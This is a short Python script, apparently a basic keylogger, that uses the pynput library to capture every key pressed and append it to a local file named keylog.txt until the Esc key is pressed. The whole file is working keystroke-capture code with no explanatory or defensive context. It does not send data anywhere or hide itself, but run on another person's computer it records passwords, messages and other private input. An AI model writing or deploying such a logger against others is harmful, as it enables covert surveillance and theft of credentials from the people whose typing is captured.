import pynput
from pynput.keyboard import Key,Listener
log_file="keylog.txt"
def on_press(key):
    with open(log_file,"a")as f:
        try:
            f.write(key.char)
        except AttributeError:
            if key==Key.space:f.write(" ")
            elif key==Key.enter:f.write("\n")
            elif key==Key.tab:f.write("\t")
            else:f.write(f"{key}")
def on_release(key):
    if key==Key.esc:return False
    
listener=Listener(on_press=on_press,on_release=on_release)
listener.start()
listener.join()